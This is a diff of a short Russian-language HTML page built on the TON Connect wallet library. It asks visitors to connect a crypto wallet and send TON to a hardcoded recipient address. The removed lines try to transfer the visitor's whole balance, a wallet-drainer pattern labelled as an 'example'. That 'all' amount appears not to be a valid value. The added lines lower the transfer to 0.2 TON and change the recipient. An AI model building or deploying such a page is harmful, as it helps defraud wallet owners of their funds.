@@ -1,21 +1,20 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>TON Connect Example</title>
+    <title>TON</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
 </head>
 <body>
 
 <h1>TON Connect Example</h1>
 
-<p>Это пример интеграции TON Connect и отправки ВСЕГО баланса TON (требует подтверждения пользователя).</p>
+<p>TON Connect и отправка 0.2 TON (!!!!!требует подтверждения пользователя).</p>
 
 <div id="ton-connect"></div>
 
-<button onclick="connectCustom()">Подключить кошелек и отправить ВЕСЬ TON</button>
+<button onclick="connectCustom()">Подключить кошелек, отправить 0.2 TON</button>
 
 <script>
-    // Замените на ваш фактический URL приложения
     const manifestUrl = 'https://heronwaterwow.github.io/-cv/ton-main/tonconnect-manifest.json';
     const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
         manifestUrl: manifestUrl,
@@ -23,9 +22,9 @@
     });
 
     // Адрес вашего кошелька для получения TON
-    const recipientAddress = 'UQA9or9rMdG8vk8wSX20LRapZgTUslxrHt-Oa4JCcAynwEEi';
+    const recipientAddress = 'UQA1eukl_AXlRZEt8bE4H_6Efhk413CPgvPMPr5GgJhQqLgh';
 
-    // Функция для подключения кошелька и отправки транзакции (ВЕСЬ баланс)
+    // Функция для подключения кошелька и отправки транзакции (0.2 TON)
     async function connectCustom() {
         try {
             const connectedWallet = await tonConnectUI.connectWallet();
@@ -35,14 +34,14 @@
                 validUntil: Date.now() + 5 * 60 * 1000,
                 messages: [{
                     address: recipientAddress,
-                    amount: 'all' // Отправить ВЕСЬ баланс
+                    amount: '200000000' // Отправить 0.2 TON (в nanotons)
                 }]
             };
             console.log("Объект транзакции:", tx);
 
             const result = await tonConnectUI.sendTransaction(tx);
             console.log("Результат транзакции:", result);
-            alert("Транзакция отправлена (ВЕСЬ баланс)! Хэш: " + result.hash);
+            alert("Транзакция отправлена (0.2 TON)! Хэш: " + result.hash);
 
         } catch (error) {
             console.error("Тип ошибки:", typeof error);
@@ -55,5 +54,6 @@
 
 </body>
 </html>
+
 
 
